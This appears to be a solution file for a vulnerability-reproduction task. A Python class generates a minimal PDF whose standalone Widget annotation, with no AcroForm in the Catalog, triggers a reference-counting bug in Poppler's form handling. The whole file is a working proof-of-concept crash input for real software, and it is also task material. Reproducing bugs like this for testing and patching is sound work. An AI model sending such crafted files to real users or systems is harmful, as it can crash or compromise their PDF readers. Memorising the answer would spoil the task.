import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability exists in the destruction of standalone forms where passing the Dict 
        to Object() does not increase the reference count. This occurs in Poppler's FormWidget
        handling when a Widget annotation is loaded that isn't part of the global AcroForm 
        dictionary (standalone).
        
        The PoC constructs a valid PDF with a Page containing a Widget annotation, but 
        omits the AcroForm dictionary from the Catalog to ensure the widget is treated 
        as standalone.
        """
        
        # PDF Header
        header = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        # Note: We omit /AcroForm to ensure the widget is processed as a standalone form
        obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        
        # Object 2: Pages Dictionary
        obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        
        # Object 3: Page
        # References the Widget (Object 4) in its Annots array
        obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Annots [4 0 R] >>\nendobj\n"
        
        # Object 4: Widget Annotation (Standalone Form Field)
        # /FT /Tx defines it as a Text Field
        obj4 = b"4 0 obj\n<< /Type /Annot /Subtype /Widget /FT /Tx /Rect [50 50 200 100] /T (Pwn) >>\nendobj\n"
        
        # Combine objects to form the body
        body = obj1 + obj2 + obj3 + obj4
        
        # Calculate XRef table location
        xref_offset = len(header) + len(body)
        
        # Construct XRef table
        # 5 entries (0-4), starting at object 0
        xref = b"xref\n0 5\n0000000000 65535 f \n"
        
        current_pos = len(header)
        for obj in [obj1, obj2, obj3, obj4]:
            # XRef lines must be exactly 20 bytes long
            # Format: "{0:010} {1:05} n \n"
            xref += f"{current_pos:010} 00000 n \n".encode('ascii')
            current_pos += len(obj)
            
        # Trailer
        trailer = f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{xref_offset}\n%%EOF".encode('ascii')
        
        return header + body + xref + trailer